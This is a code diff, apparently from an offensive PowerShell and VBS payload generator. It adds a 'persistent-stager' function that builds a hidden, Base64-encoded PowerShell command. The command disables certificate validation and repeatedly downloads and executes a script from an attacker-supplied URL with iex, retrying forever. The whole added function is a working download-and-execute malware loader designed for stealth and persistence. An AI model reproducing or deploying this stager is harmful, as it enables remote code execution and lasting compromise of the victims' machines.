@@ -548,6 +548,30 @@ function say-this {
 
 }
 
+#[->] Kicks off a looping powershell command string 
+function persistent-stager($scriptUrl) {
+
+	if ( $scriptUrl -match 'http://' -Or $scriptUrl -match 'https://' )
+        {
+
+		#[->] prep command download string to be passed to obfuscation engine
+		$cmds = 'while(1){try{ powershell -w hidden -c '
+		$cmds += '"&{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};'
+		$cmds += 'iex(New-Object System.Net.Webclient).DownloadString(''' + $scriptUrl + ''')}" }'
+		$cmds += 'catch{ Start-Sleep -s 10}Start-Sleep -s 5 }'
+		$encCmdString = gen-enccmd $cmds
+		$cmdstring = 'cmd /q /c powershell.exe -w hidden -enc ' + $encCmdString
+	
+		return $cmdstring
+
+         } else {
+
+                 write-output "[!] FAilED!`n[!]You need to use a proper URL"
+                 write-output "format ex: http://ex_domain.com/script or https://ex_domain.com/script"
+         }
+
+}
+
 # [->] vbs code generator, the obfuscation engine core algo
 function obfuscate-cmdstring($cmdstring, $sType, $vbaType) {
 
